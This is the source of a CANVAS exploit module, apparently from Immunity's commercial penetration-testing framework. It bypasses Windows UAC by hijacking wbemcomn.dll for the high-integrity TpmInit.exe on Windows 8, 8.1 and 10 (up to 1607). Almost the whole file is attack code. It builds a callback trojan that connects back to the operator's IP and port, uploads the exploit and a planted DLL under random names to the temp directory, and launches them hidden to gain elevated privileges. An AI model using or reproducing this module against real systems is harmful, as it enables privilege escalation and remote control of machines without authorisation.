#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os, getopt
import socket
import time
import struct

if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit

import canvasengine
import random

from canvaserror import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from libs.canvasos import canvasos

from win32MosdefShellServer import win32shellserver
from MOSDEF.pelib import PElib

NAME                            = "tpminit_wbemcomn"
DESCRIPTION                     = "Bypassing UAC through dll hijacking (wbemcomn.dll) on the High-IL TpmInit.exe module"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Date public"]    = "08/17/2016"
DOCUMENTATION["CVE Name"]       = None
DOCUMENTATION["CVE Url"]        = None
DOCUMENTATION['CVSS']           = None
DOCUMENTATION["URL"]            = ""
DOCUMENTATION["References"]     = ['https://github.com/Cn33liz/TpmInitUACAnniversaryBypass/blob/master/TpmInitUACBypass/TpmInitUACAnniversaryBypass.cpp']

DOCUMENTATION["Notes"] = """
Tested on:
- Windows 10 1607 Enterprise (x86)
- Windows 10 1607 Enterprise (x86_64)
- Windows 8.1 Enterprise (x86)
- Windows 8.1 Enterprise (x86_64)
- Windows 8 Pro (x86)
- Windows 8 Pro (x86_64)

"""

VERSION          = "1.0"
PROPERTY         = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [["Windows", "x64", "x86"]]


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name                = NAME
        self.node                = None
        self.use_local_interface = False
        self.local_res           = os.path.join(os.path.dirname(__file__), 'Resources')

        self.exploit             = None
        self.wbemcomn_dll        = None
        self.setVersions()

    def setVersions(self):
        self.versions = {}
        self.versions[0] = ("Automatic")

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def test(self):
        return 1

    def run_attack(self):
        remote_path = self.upload_files()
        if not remote_path:
            return False

        logging.info("Spawning exploit at %s" % remote_path)
        ret = self.node.shell.CreateProcessA(remote_path + " 1", dwCreationFlags=0x08000000)

        if not ret:
            logging.error("Failed to execute exploit")
            return False

        return True

    def upload_files(self):
        tmp_directory = self.node.shell.GetTempPathA()

        if not tmp_directory:
            logging.error('Could not resolve full temp dir path')
            return None
        else:
            logging.info('Temp dir: %s' % tmp_directory)

            if self.node.shell.chdir(tmp_directory) < 0:
                logging.error('Could not chdir into %s' % tmp_directory)
                return None

            # Creating callback
            callback_local_path = self.create_callback()
            callback_name = os.path.basename(callback_local_path)
            callback_remote_path = tmp_directory + callback_name

            # Generating random filenames
            exploit_name = self.filename_generator(len("exploit")) + ".exe"
            wbemcomn_dll_name = self.filename_generator(len("trojan")) + ".dll"

            exploit_resource_path = os.path.join(self.local_res, self.exploit)
            exploit_local_path = os.path.join(self.output(ip=self.node.get_interesting_interface(),
                                                     subdir="tpminit_wbemcomn"), exploit_name)

            # Fixing names on the exploit module
            content = None
            with open(exploit_resource_path, "rb") as handle:
                content = handle.read()
            content = content.replace("trojan.exe".encode("utf-16")[2:], callback_name.encode("utf-16")[2:])
            content = content.replace("trojan.dll".encode("utf-16")[2:], wbemcomn_dll_name.encode("utf-16")[2:])
            with open(exploit_local_path, "wb") as handle:
                handle.write(content)
            exploit_remote_path = tmp_directory + exploit_name

            # Fixing names on the dll module
            wbemcomn_resource_path = os.path.join(self.local_res, self.wbemcomn_dll)
            wbemcomn_local_path = os.path.join(self.output(ip=self.node.get_interesting_interface(),
                                                     subdir="tpminit_wbemcomn"), wbemcomn_dll_name)
            with open(wbemcomn_resource_path, "rb") as handle:
                content = handle.read()
            content = content.replace("exploit.exe".encode("utf-16")[2:], exploit_name.encode("utf-16")[2:])
            with open(wbemcomn_local_path, "wb") as handle:
                handle.write(content)
            wbemcomn_remote_path = tmp_directory + wbemcomn_dll_name

            # Uploading files
            if not self.nodeUpload(exploit_local_path, exploit_remote_path):
                logging.error('Error while uploading exploit')
                return None
            self.add_file_for_cleanup(exploit_remote_path)

            if not self.nodeUpload(wbemcomn_local_path, wbemcomn_remote_path):
                logging.error('Error while uploading dll')
                return None
            self.add_file_for_cleanup(wbemcomn_remote_path)

            if not self.nodeUpload(callback_local_path, callback_remote_path):
                logging.error('Error while uploading callback')
                return None
            self.add_file_for_cleanup(callback_remote_path)

        return exploit_remote_path

    def filename_generator(self, size):
        chars = string.ascii_uppercase + string.digits
        return "".join(random.choice(chars) for _ in range(size))

    def create_callback(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = 'X64' if self.is_64bit_node() or self.has_wow64() else 'X86'

        logging.info("Building callback to ip:%s, port:%d, architecture:%s" % (self.callback.ip, self.callback.port, t_os.arch))
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)
        callback_path = os.path.join(self.output(ip=self.node.get_interesting_interface(),
                                                 subdir="tpminit_wbemcomn"), self.filename_generator(len("trojan")) + ".exe")
        with open(callback_path, "wb") as handle:
            handle.write(self.mosdeftrojan)
        return callback_path

    def run(self):
        """
        This run happens on all nodes selected
        returns 1 if we succeed on any node
        """
        self.setInfo("%s (in progress)" % (NAME))
        ret = 0

        for node in self.argsDict["passednodes"]:
            self.summary[node] = 0
            self.node = node

            if not self.is_windows_node():
                continue

            if not any([self.is_win8_node(), self.is_win81_node(), self.is_win10_node()]):
                logging.info("Not Windows 8 / 8.1 / 10 node! Aborting")
                continue

            if self.is_64bit_node() or self.has_wow64():
                self.exploit = "tpminit_x64.exe"
            else:
                self.exploit = "tpminit_x86.exe"

            if self.is_win8_node():
                self.wbemcomn_dll = "wbemcomn_W8_x64.dll" if self.is_64bit_node() or self.has_wow64() else "wbemcomn_W8_x86.dll"
            if self.is_win81_node():
                self.wbemcomn_dll = "wbemcomn_W81_x64.dll" if self.is_64bit_node() or self.has_wow64() else "wbemcomn_W81_x86.dll"
            if self.is_win10_node():
                self.wbemcomn_dll = "wbemcomn_W10_x64.dll" if self.is_64bit_node() or self.has_wow64() else "wbemcomn_W10_x86.dll"
                if self.get_releaseid() > 1607:
                    logging.error("The Windows version is not supported")
                    return False


            if self.run_attack():
                for i in range(30):
                    if self.ISucceeded():
                        ret = 1
                        self.summary[node] = 1
                    time.sleep(0.5)

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
